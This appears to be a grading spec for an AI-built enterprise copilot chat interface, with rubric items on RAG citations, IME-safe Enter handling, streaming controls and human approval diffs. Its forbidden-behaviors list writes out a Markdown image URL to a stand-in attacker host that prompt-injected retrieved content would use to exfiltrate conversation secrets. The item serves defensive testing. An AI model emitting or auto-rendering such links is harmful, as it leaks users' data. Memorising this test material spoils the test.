title: Design an enterprise RAG & tool-calling AI workspace with Markdown image exfiltration defense, IME Enter guard, unlocked streaming composer, and HITL diff approval

contextSnapshot.surface: Enterprise AI support and database-action copilot
states: untrusted external Markdown image in retrieved doc
destructive SQL/API tool call awaiting approval
constraints: block untrusted Markdown image exfiltration via CSP img-src / proxy
preserve editable composer during streaming with Stop AbortController
guard Enter submit against active IME composition
show human-readable Before -> After diff on HITL approval cards

prompt: Build an enterprise AI copilot chat workspace that renders cited RAG answers from untrusted customer tickets, supports Japanese and Vietnamese Telex typing, lets agents approve or reject account-modifying tool calls, handles 429 rate limits, and hands off unresolved threads to a human specialist.
forbiddenBehaviors: auto-loads arbitrary external `![...](https://attacker.tld/leak?q=...)` Markdown images so prompt-injected RAG content exfiltrates conversation secrets
disables the text composer while streaming (`disabled={isBusy}`) or submits prematurely when pressing Enter to confirm IME candidates (`!event.isComposing` omitted)
renders blind raw JSON payloads on tool-approval buttons instead of a clear Before -> After impact diff, or yanks scroll position while the user reads earlier messages

rubricDimensions.dimension: prompt-injection exfiltration defense and input ergonomics
rubricDimensions.pass: blocks/proxies untrusted external Markdown images via strict CSP img-src, guards Enter-to-send with `event.isComposing || event.keyCode === 229`, keeps the composer editable during streaming with an explicit Stop (AbortController) toggle, and sticks scroll only near the bottom
rubricDimensions.fail: renders remote third-party Markdown images automatically, locks the input during streaming, or fires send on IME candidate commit

rubricDimensions.dimension: HITL transparency, grounded citations, and recovery/escalation
rubricDimensions.pass: presents Before -> After diffs on destructive tool approvals, links citations to verifiable source passages, formats errors with What/Why/Next + 429 Retry-After countdown, exposes data-retention/delete controls, and transfers context cleanly on human escalation
rubricDimensions.fail: asks users to approve opaque tool calls, invents citation URLs, or dead-ends on rate limits and unresolved intents

negativeControls.name: English happy-path chat bubble demo
negativeControls.input: streaming markdown text renders smoothly for an English prompt
negativeControls.mustNot: claim enterprise readiness without verifying Markdown image exfiltration blocking, IME Enter composition safety, HITL diff cards, and scroll-anchor discipline

baseline.withoutSkill: renders untrusted Markdown images allowing data exfiltration, disables the input while streaming, breaks Telex/CJK Enter composition, and shows raw JSON tool approvals
baseline.withSkill: delivers an exfiltration-hardened, IME-safe streaming copilot with unlocked steering, Before -> After HITL approval cards, grounded citations, and warm human escalation
